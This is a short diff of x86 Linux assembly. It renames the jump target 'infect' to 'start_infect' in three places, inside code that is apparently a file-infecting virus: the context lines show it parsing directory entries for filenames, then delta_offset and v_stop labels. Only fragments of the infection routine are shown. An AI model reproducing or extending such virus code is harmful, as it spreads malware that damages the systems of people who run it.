@@ -51,7 +51,7 @@ find_filename_start:
 
     ; check not over 1024(1056-32)
     cmp ebx, 1024
-    jge infect
+    jge start_infect
 
     ; 0x00 0x08 occurs before the start of a filename
     cmp byte [edi+32+ebx], 0x00
@@ -70,7 +70,7 @@ find_filename_start:
 copy_filename:              ; until we find the end of filename
     inc ebx
     cmp ebx, 1024
-    jge infect
+    jge start_infect
 
     ; copy file name
     push esi                ; save target offset
@@ -334,7 +334,7 @@ delta_offset:
     mov eax, 6                  ; close file
     int 80h
 
-    jmp infect
+    jmp start_infect
 
 v_stop:
     mov eax, 1                  ; sys_exit
